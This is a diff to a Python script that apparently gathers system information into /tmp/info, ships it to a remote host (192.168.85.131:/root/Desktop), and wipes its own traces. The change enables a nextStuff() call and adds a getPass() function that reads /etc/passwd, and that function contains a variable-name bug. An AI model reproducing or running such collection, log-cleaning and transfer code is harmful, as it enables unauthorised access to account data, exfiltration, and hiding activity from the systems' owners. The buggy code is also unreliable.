@@ -164,7 +164,7 @@ def w2File(result,filename,i=0):
         with open("/tmp/info/"+filename,'a') as f:
             print(result,file=f)
             sep="------------------------------------"
-            print(sep+sep+sep,file=f)
+            print(sep+sep,file=f)
         #for r in result:
         #    print(r[0],"\n",r[1],file=f)
     else:
@@ -214,12 +214,19 @@ def logClean(IPandLoc):
                 " bs=1 count="+size[4])
     bashCmd("rm -rf /tmp/info/")
 
+def getPass():
+    passwrd=[]
+    with open ("/etc/passwd","r") as p:
+        passwd.append(p.readline())
+    print(passwd)
+
 ##########################################
 
 if not os.path.exists('/tmp/info'):
     os.makedirs('/tmp/info')
 
 preLim()
-#nextStuff()
+nextStuff()
+getPass()
 #xferFile()
 logClean("192.168.85.131:/root/Desktop")
